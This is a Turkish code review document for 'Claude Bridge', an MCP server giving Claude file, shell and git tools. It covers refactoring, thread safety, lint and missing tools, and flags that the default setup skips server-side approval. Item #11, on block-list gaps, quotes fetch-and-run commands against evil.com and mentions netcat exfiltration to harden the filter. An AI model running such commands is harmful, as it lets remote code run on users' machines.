# Claude Bridge — Kod İnceleme Önerileri

Bu dosya, projenin tamamı incelendikten sonra tespit edilen teknik sorunları ve önerileri öncelik sırasına göre listeler.

---

## 2025-05 İnceleme Notları — Yeni Dalga Analizi

### ✅ Bu Turda Tamamlananlar (Kutlanacak Şeyler)

Önceki inceleme bıraktığı yerden ciddi ilerleme kaydedildi:

| Madde | Durum |
|---|---|
| God file (`server.py`) modülerleştirildi | ✅ 8 ayrı modül (`config`, `file_tools`, `git_ops`, `indexing`, `shell_tools`, `tool_utils`, `workflow_tools`, `prompt`) |
| `write_file` eklendi | ✅ Secret taraması, syntax check, `create_parents` desteğiyle |
| `search_in_files` eklendi | ✅ `regex`, `case_sensitive`, `include_glob`, `limit` parametreleriyle |
| `preview_patch` eklendi | ✅ Diff + risk skoru döndürüyor |
| `undo_last_patch` eklendi | ✅ `confirm` flag ve git ile geri alım |
| `path_outside_project` hatası zenginleştirildi | ✅ `active_project_dir`, `allowed_roots`, `hint`, `suggested_next_tools` alanlarıyla |
| Sistem promptu recovery flow ile güncellendi | ✅ "do not give up, call workspace_status first" talimatı |
| Thread safety getter'larda düzeltildi | ✅ Tüm getter'lar `_CONFIG_LOCK` altında |
| Patch risk skoru | ✅ `_estimate_patch_risk` (low/medium/high + gerekçeler) |
| Framework detection | ✅ Godot, Django, Vite, Next.js, Node, Rust, Go, Python |
| Context pack builder | ✅ `build_context_pack` |
| Agent loop session + compaction | ✅ `run_agent_loop_session` + `compact_agent_loop_result` |
| Test kapsamı | ✅ **137 test, tümü yeşil, 3.97 saniye** |

Bu tur son derece üretken geçti. Aşağıdakiler bundan sonra yapılacaklar.

---

## 🔴 Acil — Yeni Tespitler (2025-05)

### 43. Modül Mutasyonu ile Bağımlılık Enjeksiyonu — Gizli Race Condition

**Sorun:**

`server.py`'de `write_file`, `patch_file` ve `undo_last_patch` her çağrılmadan önce şunu yapıyor:

```claudey code/src/claude_bridge/server.py#L162-163
_file_tools_mod._git_commit = _git_commit
return await _file_write_file(...)
```

Bu, `file_tools` modülündeki `_git_commit` değişkenini her istekte üzerine yazıyor. Böylece `server._git_commit` wrapper'ı `file_tools` içine enjekte ediliyor. Bu neden sorunlu:

1. **Thread-unsafe**: İki eşzamanlı istek geldiğinde biri diğerinin `_git_commit`'ini değiştirebilir. MCP stdio şu an single-thread çalışıyor ama bu garanti değil.
2. **Anlaşılmaz side-effect**: "Bu fonksiyonu çağırmadan önce modülün içini değiştiriyorum" şeklinde bir patern gizli bağımlılık yaratır.
3. **Test bozukluğu riski**: Testler `monkeypatch.setattr(mcp_server, "_git_commit", ...)` ile `server._git_commit`'i değiştiriyor; bu sadece `_file_tools_mod._git_commit = _git_commit` satırı sayesinde çalışıyor — yani test kurulumu kırılgan ve niyeti gizliyor.

**Öneri:**

`file_tools.py`'deki fonksiyonlara `git_commit_fn` parametresi ekle:

```/dev/null/file_tools.py#L1-5
async def patch_file(
    file: str, search: str, replace: str,
    *,
    git_commit_fn: Callable[..., dict[str, Any]] | None = None,
) -> str:
    ...
    _commit = git_commit_fn or git_commit
```

`server.py`'de ise `_git_commit=_git_commit` olarak geçir. Bu modül durumunu kirletmez ve test edilmesi gerçek bağımlılığı açıkça gösterir.

---

### 44. Lint Hataları — `ruff check` 5 Uyarı Veriyor ✅ TAMAMLANDI

~~`python -m ruff check src/` çıktısı:~~

| Dosya | Satır | Kural | Açıklama | Durum |
|---|---|---|---|---|
| `server.py` | 5 | F401 | `import json` — kullanılmıyor | ✅ Silindi |
| `server.py` | 12 | F401 | `_CONFIG` kullanılmıyor | ✅ `# noqa: F401` + yorum eklendi (backward-compat re-export) |
| `server.py` | 28 | F401 | `_INDEX_CACHE` kullanılmıyor | ✅ `# noqa: F401` + yorum eklendi (backward-compat re-export) |
| `server.py` | 54 | F401 | `_build_agent_loop_execution_plan` kullanılmıyor | ✅ Silindi |
| `server.py` | 55 | F401 | `workflow_prompt as _workflow_prompt` kullanılmıyor | ✅ Silindi |
| `file_tools.py` | 697 | F841 | `current_content` atanmış ama hiç kullanılmıyor | ✅ Blok kaldırıldı |

`python -m ruff check src/` → **All checks passed!** (137 test hâlâ yeşil)

---

### 45. Thread Safety Açığı — `set_active_project_dir` Kilitsiz `_CONFIG` Okuması ✅ TAMAMLANDI

~~`tool_utils.py`'deki `set_active_project_dir` fonksiyonu `_CONFIG`'i doğrudan okuyor~~

`_CONFIG["auto_approve"]`, `_CONFIG["client_managed_approval"]`, `_CONFIG["shell_timeout"]` doğrudan erişimleri,
kilitli getter'larla (`approval_mode()`, `shell_timeout()`) değiştirildi:

```claudey code/src/claude_bridge/tool_utils.py#L135-147
def set_active_project_dir(next_project_dir: Path) -> None:
    resolved = next_project_dir.resolve()
    if not any(is_within_root(resolved, root) for root in allowed_roots()):
        raise PermissionError("Requested project root is not in allowed roots")
    auto_approve, client_managed_approval = approval_mode()
    apply_config(
        project_dir=resolved,
        allowed_roots=allowed_roots(),
        auto_approve=auto_approve,
        client_managed_approval=client_managed_approval,
        shell_timeout=shell_timeout(),
    )
    clear_index_cache()
```

`_CONFIG` importu da `tool_utils.py`'den kaldırıldı — artık hiç doğrudan `_CONFIG` erişimi yok.

---

## 🟠 Yakın Vadeli — Yeni Tespitler (2025-05)

### 46. `_SKIP_DIRS` Ölü Kod — `server.py`'de Tanımlı Ama Hiç Kullanılmıyor

`server.py` satır ~68'de:

```claudey code/src/claude_bridge/server.py#L65-75
_SKIP_DIRS = {
    ".git",
    ".hg",
    ...
}
```

Bu set `server.py`'de hiçbir yerde kullanılmıyor. Aynı tanım `indexing.py`'de de var ve orada aktif olarak kullanılıyor. `server.py`'deki kopya silinmeli.

---

### 47. Testler `mcp_server._CONFIG`'e Doğrudan Erişiyor — Kırılgan Kuplaj

`test_env_config.py` gibi test dosyaları şunu yapıyor:

```claudey code/tests/test_env_config.py#L19-20
assert mcp_server._CONFIG["project_dir"] == tmp_path.resolve()
assert mcp_server._CONFIG["auto_approve"] is True
```

`_CONFIG` bir iç uygulama detayı. Testler bunun yerine `mcp_server._project_dir()`, `mcp_server._allowed_roots()` gibi kamuya açık getter fonksiyonları kullanmalı. Şu anki yaklaşım:

- `config.py`'deki `_CONFIG`'in dict anahtarlarını değiştirince testler kırılır.
- Dışarıya sızan iç API izidir; ileride refactor engelleyici olabilir.

**Öneri:** Testlerdeki `_CONFIG["x"]` erişimlerini `config.py`'deki getter fonksiyonlarına (`project_dir()`, `approval_mode()`, `shell_timeout()`) göre güncelle.

---

### 48. `request_approval` MCP Stdio Modunda Terminal'i Blokluyor

`tool_utils.py`'deki `request_approval`:

```claudey code/src/claude_bridge/tool_utils.py#L155-162
print(f"\n[{tool_name}]")
for key, value in params.items():
    print(f"  {key}: {value}")
answer = input("Approve? (y/n): ").strip().lower()
return answer == "y"
```

MCP stdio protokolü `stdout`'u JSON mesajlaşması için kullanır. `print()` bu akışı bozar. `input()` ise MCP sunucusunu dondurur çünkü stdio kanalı Claude Desktop tarafından kullanılıyor.

Bu yol şu an `auto_approve=True` veya `client_managed_approval=True` olmadığında tetiklenir. `build_desktop_config` `CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL=1` ayarlıyor ama birisi `mcp_server.py`'i doğrudan bu env var olmadan çalıştırırsa sunucu sessizce kilitlenir.

**Öneri:**
1. `request_approval` içine `stderr` uyarısı ekle ("approval flow not configured for stdio mode").
2. `mcp_server.py __main__` bloğuna fallback olarak `client_managed_approval=True` varsayılsın veya bir CLI flag eklensin.
3. En azından dokümantasyona ekle: "Doğrudan çalıştırırsan `CLAUDE_BRIDGE_CLIENT_MANAGED_APPROVAL=1` set et."

---

### 49. `mcp_server_noapproval.py` İsmi Hâlâ Yanıltıcı

Önceki incelemede de işaretlendi (#7). Bu modül `force_auto_approve=True` yapıyor, yani onay tamamen devre dışı. Ama isim "noapproval" gibi davranışı özetliyor, nedenini değil. Olası yanlış anlama: "bu modül, onay mekanizması olmayan güvensiz bir alternatif" izlenimi veriyor.

**Öneri:** `mcp_server_autoapprove.py` veya `mcp_server_desktop.py` gibi bir isim daha açıklayıcı olur. Ya da tek bir `mcp_server.py` içinde `--auto-approve` flag'i ile halledilir.

---

## 🟡 Orta Vadeli — Yeni Tespitler (2025-05)

### 50. `workflow_tools.py` Hâlâ 1134 Satır

`run_workflow` fonksiyonu (~L756–L1017) 262 satır, içinde büyük `steps`, `examples`, `warnings`, `quality_bar`, `orchestration_rules` sözlükleri var. Bu sabit veriler fonksiyon gövdesinde yaşıyor.

**Öneri:** Bu sözlükleri modül seviyesine al:

```/dev/null/workflow_tools.py#L1-5
_WORKFLOW_STEPS: dict[str, list[str]] = {
    "review": [...],
    "optimize": [...],
    ...
}
```

Bu, `run_workflow` gövdesini ~100 satıra indirir ve birimleri bağımsız test edilebilir hale getirir.

---

### 51. `search_in_files` Limit Kontrolü Limit Aşıldığında Dosyayı Yarıda Kesiyor

Mevcut uygulama:

```claudey code/src/claude_bridge/file_tools.py#L494-499
if len(results) >= limit:
    break
if len(results) >= limit:
    break
```

İç döngü limitine ulaşınca o dosyadan çıkıyor, dış döngü de çıkıyor. Bu doğru çalışıyor ama yanıt `truncated: true` bayrağı taşımıyor. Claude hangi sonuçların eksik olduğunu bilemiyor.

**Öneri:** Yanıt payload'una `truncated: bool` ve `files_searched: int` ekle:

```/dev/null/response.py#L1-6
return json_response(
    True, ...,
    details={
        ...,
        "truncated": len(results) >= limit,
        "files_searched": files_searched_count,
    },
)
```

---

### 52. `pyproject.toml` Placeholder URL'leri Hâlâ Değiştirilmedi

```claudey code/pyproject.toml#L49-52
[project.urls]
Homepage = "https://github.com/yourusername/claude-bridge"
Repository = "https://github.com/yourusername/claude-bridge"
Issues = "https://github.com/yourusername/claude-bridge/issues"
```

Yayınlama öncesi bunlar gerçek URL ile değiştirilmeli. Bu madde önceki incelemede de (#5) işaretlenmişti.

---

## 🟢 Uzun Vadeli — Yeni Tespitler (2025-05)

### 53. `create_directory`, `move_file`, `delete_file` Araçları Hâlâ Eksik

`write_file`, `patch_file`, `undo_last_patch` artık mevcut ama temel dosya sistemi operasyonlarının tamamı için şunlar hâlâ yok:

| Araç | Öncelik | Not |
|---|---|---|
| `create_directory` | Yüksek | `write_file(create_parents=True)` kısmen kapıyor ama dizin oluşturma ayrı olmalı |
| `move_file` / `rename_file` | Orta | Refactor'larda kritik; şu an `run_shell("mv ...")` ile geçici çözüm |
| `delete_file` | Orta | Onay mekanizması zorunlu; `undo_last_patch` kapsamı dışında |

Bu araçlar olmadan Claude, sıradan refactor görevlerinde `run_shell` kullanmak zorunda kalıyor — bu da shell güvenlik katmanını gereksiz yere tetikliyor.

---

### 54. `language` Varsayılanı "Turkish" — Uluslararası Kullanımı Kırıyor

`workflow_tools.py` ve `server.py`'deki `run_workflow` tanımı:

```claudey code/src/claude_bridge/server.py#L501-507
async def run_workflow(
    mode: str,
    target: str = ".",
    option: str | None = None,
    language: str = "Turkish",
    ...
```

Ve `register_prompts` içindeki lambda'larda da sabitlenmiş. Bu araç başka kullanıcılara dağıtılmak istenirse:

1. Varsayılan dil "Turkish" olursa İngilizce konuşan kullanıcılar için anlamsız çıktılar üretir.
2. Tek kaynak noktasından (bir env var veya config) kontrol edilemiyor.

**Öneri:** `CLAUDE_BRIDGE_DEFAULT_LANGUAGE` env var'ı ekle; `configure_from_env`'de oku; `language` varsayılanını oradan al. Şu an için "Turkish" yerelde doğru bir seçim ama ileride `language: str = _config_default_language()` şeklinde bağlanmalı.

---

### 55. `find_relevant_files` Her Çağrıda Sıfırdan Skorluyor — Önbelleksiz

Bu madde önceki incelemede de (#12) işaretlenmişti ama hâlâ kapanmadı. Aynı sorgu + aynı proje için skorlar tekrar hesaplanıyor. Özellikle büyük projelerde (`find_relevant_files` → N dosya × M anahtar kelime) performans sorunu yaratabilir.

**Öneri:** `(query_hash, index_snapshot_key)` çiftini önbellek anahtarı olarak kullan. `indexing.py`'deki mevcut snapshot mekanizması buna hazır.

---

## Güncellenmiş Öncelik Özeti (2025-05)

| Öncelik | Madde | İş Büyüklüğü | Durum |
|---|---|---|---|
| ✅ Bitti | #44 Lint hataları temizle | XS | ✅ Tamamlandı |
| ✅ Bitti | #45 `set_active_project_dir` thread safety | XS | ✅ Tamamlandı |
| 🔴 Hemen | #43 Module mutation DI → parametre geç | S — 1 saat | Açık |
| 🟠 Bu sprint | #46 `server.py` dead `_SKIP_DIRS` sil | XS — 2 dk | Açık |
| 🟠 Bu sprint | #48 `request_approval` stdio uyarısı | S — 30 dk | Açık |
| 🟠 Bu sprint | #51 `search_in_files` `truncated` bayrağı | S — 30 dk | Açık |
| 🟠 Bu sprint | #53 `create_directory` aracı | M — yarım gün | Açık |
| 🟡 Sonraki sprint | #47 Test kuplajını getter'a çevir | S — 1 saat | Açık |
| 🟡 Sonraki sprint | #50 `workflow_tools.py` sabitleri dışarı al | S — 1 saat | Açık |
| 🟡 Sonraki sprint | #54 `language` env var ile yapılandırılabilir | S — 1 saat | Açık |
| 🟢 İleride | #49 `mcp_server_noapproval.py` yeniden adlandır | XS — 5 dk | Açık |
| 🟢 İleride | #52 pyproject.toml URL'leri güncelle | XS — 2 dk | Açık |
| 🟢 İleride | #53 `move_file`, `delete_file` | L — 1 gün | Açık |
| 🟢 İleride | #55 `find_relevant_files` sonuç önbelleği | M — yarım gün | Açık |

---

## 2026-04-27 Karar Notları

Bu dosyadaki tüm maddeler aynı önemde değil. Mevcut kod durumu ve ürün yönü açısından en mantıklı ayrım şu:

### Kesin Yapılmalı

- `write_file` ve `search_in_files` eklenmeli.
- `path_outside_project` hata detayları daha yönlendirici olmalı ve recovery akışı netleştirilmeli.
- Approval davranışı README'de gerçeğe uygun anlatılmalı.
- `run_agent_loop_session` için structured steps ve daha güvenli compact/handoff akışı geliştirilmeli.
- Secret/privacy guard eklenmeli; bu proje paylaşılabilir ürün olacağı için kritik.

### Yapılmalı Ama İkinci Dalga

- `preview_patch` veya `patch_file(dry_run=true)`
- `undo_last_patch` / rollback
- patch risk skoru
- shell command risk skoru
- framework detection + validation suggestion tools
- indeks persistence
- `server.py` dosyasını modüllere bölme

### Şimdilik Bekleyebilir

- Local web approval UI
- workspace profiles
- project doctor / health score
- publish readiness scan'ı ayrı tool olarak büyütmek
- `find_relevant_files` ileri performans optimizasyonları

### Şu An Gereksiz veya Koşullu

- `%90 kullanım limiti` aşıldığında otomatik özet üretme fikri, Claude Bridge tek başına göremez; çünkü kullanım yüzdesi MCP sunucusuna verilmez.
- Bu özellik ancak istemci tarafı usage telemetry sağlarsa mantıklı olur.
- O yüzden bugünden uygulanabilir sürüm: manuel `handoff_summary` üretmek veya client bir eşik bilgisi gönderirse onun üzerine compact yapmak.

### Bu Dosyadaki Bazı Maddelerin Güncel Durumu

- Getter thread-safety maddesi artık kısmen kapandı; getter'lar lock altında okunuyor.
- Session summary / compact summary maddesi artık başladı; temel `session_summary` mevcut.
- Shell güvenliği ilk rapora göre belirgin biçimde güçlendi; ama strict allow-list modu hâlâ ayrı bir ürün kararı.
- `PROGRESSION.md` tarih maddesi artık "gelecek tarih" sayılmaz; mevcut çalışma tarihi 2026 bağlamında bu eleştiri eskidi.

---

## 🔴 Acil

### 1. `prompt.py` Import Zamanı Yan Etkisi

`prompt.py` dosyasının en altında şu satır var:

```python
MCP_SETUP_GUIDE = generate_mcp_setup_guide(Path.cwd())
```

Bu satır, modül import edildiği anda çalışır ve `Path.cwd()` kullanır. Sunucu hangi dizinden başlatılırsa o dizini kullanır — kullanıcının gerçek proje dizinini değil. Üstelik CLI'daki `setup` komutu bu sabiti kullanmıyor; her yerde `generate_mcp_setup_guide(project_dir)` doğrudan çağrılıyor. Yani bu sabit hem yanlış değer üretiyor hem de kullanılmıyor.

**Öneri:** `MCP_SETUP_GUIDE` sabitini kaldır.

---

### 2. Thread Safety: Getter Fonksiyonlar Kilitsiz

`set_config` ve `configure_from_env` içinde `_CONFIG_LOCK` kullanılıyor ama `_project_dir()`, `_allowed_roots()`, `_shell_timeout()`, `_approval_mode()` gibi getter'lar kilitsiz okuma yapıyor. Eş zamanlı iki istek geldiğinde `_CONFIG` sözlüğü yarı güncellenmiş halde okunabilir.

**Öneri:** Getter fonksiyonları da `with _CONFIG_LOCK:` bloğuna al ya da `_CONFIG` yerine atomik erişim sağlayan bir yapı (örn. frozen dataclass + lock) kullan.

---

## 🟠 Yakın Vadeli

### 3. 30 Saniyelik Yavaş Test

`test_security.py` içindeki timeout testi gerçekten 30 saniye bekliyor:

```python
await mcp_server.run_shell("python3 -c 'import time; time.sleep(31)'")
```

Bu, her `pytest` çalıştırmasında test suite'i gereksiz yavaşlatıyor.

**Öneri:** İlgili `temp_project` fixture'ında veya testin başında `set_config(..., shell_timeout=2)` ile timeout'u geçici olarak düşür, `sleep(3)` yeterli olur.

---

### 4. `PROGRESSION.md` Tarih Hatası

```
**Tarih:** 2026-04-26
```

2026 yılı bir gelecek tarih. Muhtemelen 2025 olmalı.

**Öneri:** Tarihi düzelt.

---

### 5. `pyproject.toml` Placeholder URL

```toml
Homepage = "https://github.com/yourusername/claude-bridge"
Repository = "https://github.com/yourusername/claude-bridge"
```

Yayın öncesi gerçek GitHub URL'si ile değiştirilmeli.

**Öneri:** Repo oluşturulduktan sonra `yourusername` kısmını gerçek kullanıcı adıyla güncelle.

---

### 6. `archive/claude-bridge-plan.md` Guncel Degil

Bu dosya, bookmarklet + `localhost:7337` üçlü mimarisini anlatıyor. Proje çoktan bu mimariden MCP stdio yaklaşımına geçmiş. Dosya okunduğunda projenin gerçek durumunu yanlış anlatıyor.

**Öneri:** Dosyanın başına kısa bir not ekle:

```markdown
> **Not:** Bu dosya projenin ilk mimari planını belgelemektedir.
> Gerçek implementasyon MCP stdio sunucusuna geçmiştir. Güncel mimari için README.md'ye bakın.
```

---

### 7. `mcp_server_noapproval.py` Belirsizliği

Bu dosya hiçbir CLI komutuna bağlı değil, README'de de geçmiyor. Sessizce var olmaya devam ediyor.

**Öneri:** Ya tamamen sil, ya da `claude-bridge start --force-auto-approve` gibi bir CLI flag'ine bağla ve README'de belgele. Aksi hâlde bakım yükü yaratmaya devam eder.

---

## 🟡 Orta Vadeli

### 8. `server.py` Tanrı Dosya Problemi

1715 satır, tek dosyada: config yönetimi, path çözümleme, git entegrasyonu, shell çalıştırma, patch motoru, sembolik indeksleme, workflow motoru, prompt kaydı... Hepsi bir arada. Bu durum dosyanın okunmasını, test edilmesini ve geliştirilmesini zorlaştırıyor.

**Öneri:** Şu şekilde bölünebilir:

| Yeni Dosya | İçerik |
|---|---|
| `config.py` | `_CONFIG`, `set_config`, `configure_from_env`, getter fonksiyonlar |
| `git.py` | `_git_commit`, `_git_status_snapshot` |
| `indexer.py` | `_build_index`, `_extract_symbols`, `_iter_source_files`, `_read_gitignore_patterns`, `_build_gitignore_spec` |
| `tools/shell.py` | `run_shell`, `_blocked_command_reason`, `_is_interactive_command` |
| `tools/files.py` | `read_file`, `list_directory`, `patch_file` |
| `tools/workspace.py` | `workspace_status`, `switch_project_root` |
| `tools/workflow.py` | `run_workflow`, `_workflow_prompt`, yardımcılar |
| `tools/agent.py` | `run_agent_loop_step`, `run_agent_loop_session` |
| `tools/index.py` | `index_codebase`, `find_relevant_files` |
| `server.py` | Sadece `mcp` instance'ı, tool kaydı ve `run_mcp_server` |

---

### 9. `run_workflow` Fonksiyonu Çok Büyük

`run_workflow` tek başına 350+ satır. İçinde mode validasyonu, prompt üretimi, discovery execution, agent loop planı, read/list çağrıları iç içe geçmiş durumda.

**Öneri:** En azından şu ayrımı yap:

- `_execute_workflow_discovery(target, mode, option, max_iterations)` → execute bloğunu ayır
- `_build_workflow_response(mode, target, prompt, execution, ...)` → sonuç dict'ini oluşturmayı ayır

---

### 10. `_resolve_path` Davranış Asimetrisi

Göreceli path verildiğinde sadece aktif `_project_dir()` kontrol ediliyor. Mutlak path verildiğinde tüm `_allowed_roots()` kontrol ediliyor. Bu asimetri belgelenmemiş ve beklenmedik hatalara yol açabilir.

Örneğin: İkincil bir `allowed_root` içindeki dosyaya göreceli path ile erişim her zaman mümkün değil ama mutlak path ile mümkün.

**Öneri:** Davranışı belgele ya da göreceli path için de `_allowed_roots()` kontrolünü ekle.

---

## 🟢 Uzun Vadeli

### 11. Shell Güvenlik Listesi Eksiklikleri

Şu an blok list yaklaşımı kullanılıyor. Engellenenler sağlam ama bazı vektörler atlanmış:

- `curl https://evil.com/x.sh -o /tmp/x.sh && bash /tmp/x.sh` — pipe olmadan ama aynı etki
- `wget -O- https://evil.com | python3` — python pipe
- `nc` (netcat) ile veri sızdırma
- `env CMD` veya `xargs` üzerinden dolaylı çalıştırma

**Öneri:** Kısa vadede `wget | python` ve `curl ... && bash` pattern'leri eklenebilir. Uzun vadede "block list" yerine "allow list" yaklaşımı daha güvenlidir: sadece `pytest`, `python3 -c`, `git`, `ruff`, `black`, `ls`, `cat` gibi açıkça onaylanmış komutlara izin ver. Bu kırıcı bir değişiklik olduğundan isteğe bağlı bir `--strict-shell` modu olarak sunulabilir.

---

### 12. `find_relevant_files` Skoru Her Seferinde Yeniden Hesaplıyor

`_build_index` sonucu cache'leniyor ama relevance skoru hesabı her `find_relevant_files` çağrısında tüm dosyalar üzerinde döngü çalıştırıyor. Şu an için yeterince hızlı ama codebase büyüdükçe (10k+ satır, 200+ dosya) belirgin bir yavaşlama olabilir.

**Öneri:** Şimdilik kritik değil. Gerekirse dosya başına önceden hesaplanmış token seti (set intersection ile hızlı eşleşme) ile optimize edilebilir.

---

## Öncelik Özeti

| Öncelik | Konu | Efor |
|---|---|---|
| 🔴 Acil | `prompt.py` import yan etkisi | Çok düşük |
| 🔴 Acil | Thread safety getter'lar | Düşük |
| 🟠 Yakın | 30s yavaş test | Çok düşük |
| 🟠 Yakın | `PROGRESSION.md` tarih hatası | Çok düşük |
| 🟠 Yakın | `pyproject.toml` placeholder URL | Çok düşük |
| 🟠 Yakin | `archive/claude-bridge-plan.md` notu | Cok dusuk |
| 🟠 Yakın | `mcp_server_noapproval.py` kararı | Düşük |
| 🟡 Orta | `server.py` modüllere bölme | Yüksek |
| 🟡 Orta | `run_workflow` refactor | Orta |
| 🟡 Orta | `_resolve_path` asimetrisi | Düşük |
| 🟢 Uzun | Shell allow-list yaklaşımı | Orta |
| 🟢 Uzun | `find_relevant_files` performans | Düşük |

---

## Derin Analiz: Özellik Boşlukları, Tasarım Tutarsızlıkları ve Proje Yönü

Bu bölüm, kodun tamamı ikinci kez okunduktan sonra tespit edilen daha derin sorunları ve projenin nereye gidebileceğine dair değerlendirmeleri içerir.

---

### Genel Resim

Proje temel olarak saglam. Yapilandirilmis JSON yanitlar, async MCP entegrasyonu, path traversal korumasi ve gercekten kullanilmis bir test suite mevcut. Ama projenin su an iki ayri yerde oldugu goruluyor: biri hala "fikir asamasinda" olan belgeler (`archive/claude-bridge-plan.md`, bazi roadmap maddeleri), digeri ise gercekten calisan kod. Bu iki katmanin arasindaki ucurum, projeyi inceleyen birinin kafasini karistiriyor.

---

## 🔴 Eksik Temel Araçlar

### 13. `write_file`, `search_in_files`, `move_file`, `delete_file` Yok

Şu an `patch_file` ile var olan bir dosyayı değiştirebiliyorsunuz. Ama Claude Code benzeri bir deneyim için bunlar eksik:

- **`write_file`** — Yeni dosya oluşturmak mümkün değil. Bunu şu an `run_shell("echo ... > dosya")` ile yapabilirsiniz ama bu hem güvensiz hem de kırılgan. Claude Code'da en sık kullanılan özelliklerden biri yeni dosya yazmaktır.
- **`search_in_files`** — `find_relevant_files` indeks tabanlı çalışıyor; daha önce `index_codebase` çağrılmış ve sadece Python/GDScript destekleniyor. Ama çok yaygın bir ihtiyaç şu: "Bu string hangi dosyalarda geçiyor?" Bunu `run_shell("grep -r ...")` ile yapabilirsiniz ama doğrudan bir tool olarak sunmak çok daha temiz olurdu.
- **`move_file` / `rename_file`** — Refactor işlemlerinde sık gerekir.
- **`delete_file`** — Onaylı silme işlemi için `run_shell("rm ...")` gerekiyor, bu da güvenlik filtresinin `rm -rf` kısıtlamasıyla çakışabiliyor.
- **`create_directory`** — `run_shell("mkdir -p ...")` gerekiyor.

Bu eksiklikler "gelişmiş özellikler" değil, temel dosya sistemi operasyonları. Projenin "Claude Code deneyimi" iddiasıyla çelişiyor.

**Öneri:** En az `write_file` ve `search_in_files` ekle. Diğerleri ikinci tur.

---

## 🔴 Approval Sistemi Yanıltıcı

### 14. Varsayılan Konfigürasyonda Gerçekte Hiçbir Onay Yok

README'de şu yazıyor: *"Hiçbir değişiklik onaysız uygulanmaz."*

Ama varsayılan config şu:

```python
"auto_approve": False,
"client_managed_approval": True,   # varsayılan: True
```

`client_managed_approval=True` olduğunda `_request_approval` her zaman `True` döndürüyor. Claude Desktop aslında tool çağrılarından önce kullanıcıya sormak zorunda değil — ve genellikle sormaz. Gerçekte varsayılan kurulumda hiçbir sunucu taraflı onay yok. Bu, güvenlik vaadini boşa çıkarıyor.

**Öneri:** README'deki güvenlik açıklamasını gerçek davranışı yansıtacak şekilde güncelle. Ya da Claude Desktop'un onay mekanizmasının nasıl çalıştığını (ya da çalışmadığını) daha net belgele.

---

## 🟠 Kötü API Tasarımı

### 15. `run_agent_loop_session` JSON String Alıyor

```python
async def run_agent_loop_session(
    steps_json: str,
    max_iterations: int = 3,
) -> str:
```

`steps_json: str` parametresi, Claude'un MCP üzerinden bir JSON string encode edip göndermesini gerektiriyor. Claude bunu yapabilir ama bu gereksiz bir adım. MCP tool parametreleri doğal olarak JSON destekliyor; Python tarafında `list[dict]` olarak tanımlanabilirdi. Bu, aracı kullanmayı zorlaştıran ve hata üretmeye açık bir geçici çözüm.

**Öneri:** MCP SDK'nın desteklediği ölçüde `steps: list[dict]` olarak yeniden tasarla. Geriye dönük uyumluluk için `steps_json` geçici olarak tutulabilir.

---

## 🟠 İndeks Katmanı Sınırlamaları

### 16. Tüm Dosya İçeriği RAM'de Tutuluyor

Her indekslenen dosyanın ham içeriği `"content": source` olarak dict'e ekleniyor. `_public_index_payload` bunu API yanıtından çıkarıyor ama iç cache'de tam içerik duruyor. 50 dosyalık bir Python projesi için önemsiz, ama 500 dosyalık bir projede belleği şişirir.

**Öneri:** Cache'de içerik yerine dosya başına token seti ya da hash saklansın; içerik sadece `find_relevant_files` skoru hesaplanırken diskten okunup bırakılsın.

### 17. İndeks Oturum Arası Kaybolıyor

Claude Desktop yeniden başlatıldığında tüm cache sıfırlanıyor. Büyük bir proje için `index_codebase` her oturumda çağrılmak zorunda kalıyor.

**Öneri:** `.claude-bridge/index.json` gibi bir dosyaya yazıp sonraki oturumda `mtime` kontrolüyle yeniden yükleme yap. Bu hem başlangıç süresini kısaltır hem de oturum sürekliliği sağlar.

### 18. GDScript Parser Çok Basit

Python için `ast.parse` kullanılıyor — bu sağlam. Ama GDScript için line-by-line regex var:

```python
for line in source.splitlines():
    stripped = line.strip()
    if stripped.startswith("func "):
        fn_name = stripped[5:].split("(")[0].strip()
```

Bu yaklaşım iç içe fonksiyonları, yorum satırı içindeki `func` kelimesini ya da daha karmaşık GDScript yapılarını yanlış işleyebilir.

**Öneri:** Kısa vadede mevcut parser yeterli. Ama bir `LANGUAGE_PARSERS` registry yapısı kurulursa yeni diller eklenmesi kolaylaşır. Uzun vadede en azından TypeScript/JavaScript desteği eklenmeli.

---

## 🟠 Hardcoded Godot Bağımlılığı

### 19. `_supplemental_review_targets` Tüm Projelerde Godot Dosyalarına Bakıyor

```python
def _supplemental_review_targets(target: Path) -> list[Path]:
    project_candidates = [
        project_root / "project.godot",
        project_root / "export_presets.cfg",
    ]
```

Bu fonksiyon tüm projelerde çalışıyor ama içeriği tamamen bir Godot oyunu için yazılmış. `manage.py`, `package.json`, `Cargo.toml`, `docker-compose.yml` gibi diğer framework'lerin giriş noktaları hiç dikkate alınmıyor.

**Öneri:** Framework'ü otomatik algılayan genel bir mekanizma kur. Örneğin `project.godot` varsa Godot, `package.json` varsa Node, `Cargo.toml` varsa Rust supplemental targets öner.

---

## 🟡 Tasarım Tutarsızlıkları

### 20. `language` Parametresi Çoğu Workflow Modunda İşlevsiz

`_workflow_prompt` fonksiyonuna `language` parametresi geliyor ama sadece `explain` modu kullanıyor:

```python
"explain": (
    ...
    f"Response language: {language}\n"   # sadece burada kullanılıyor
),
"review": (
    "Review the target for bugs..."      # language hiç kullanılmıyor
),
```

`run_workflow(mode="review", language="English")` çağrısı hiçbir şeyi değiştirmiyor. Üstelik `_register_prompts` içindeki tüm lambda'lara `language="Turkish"` hardcode edilmiş.

**Öneri:** Ya `language` parametresini tüm modlara uygula ("Respond in {language}." satırı ekle), ya da sadece `explain`'e özgü yap ve diğer modlardan kaldır.

### 21. Git Commit Mesajları Anlamsız

Her patch sonrası commit mesajı sabit:

```python
["git", "commit", "-m", f"bridge: update {relative_file}"]
```

Claude neyi neden değiştirdiğini biliyor ama bu bilgi commit geçmişine yansımıyor. `bridge: update server.py` mesajı 20 commit sonra hiçbir anlam taşımıyor.

**Öneri:** `patch_file` tool'una opsiyonel bir `description: str = ""` parametresi ekle. Verilirse commit mesajı `bridge: update {file} — {description}` olsun.

### 22. `test_bookmarklet.py` Yanlış İsimlendirilmiş

`test_bookmarklet.py` dosyası `SYSTEM_PROMPT` ve `MCP_SETUP_GUIDE` test ediyor — bookmarklet mimarisinden MCP'ye geçilmiş ama dosya ismi kalmış. Üstelik `test_prompts.py` ile kısmen örtüşüyor.

**Öneri:** `test_bookmarklet.py` → `test_system_prompt.py` olarak yeniden adlandır. İki dosyanın kapsamını netleştir.

---

## 🟡 Test Eksiklikleri

### 23. Test İzolasyonu Zayıf

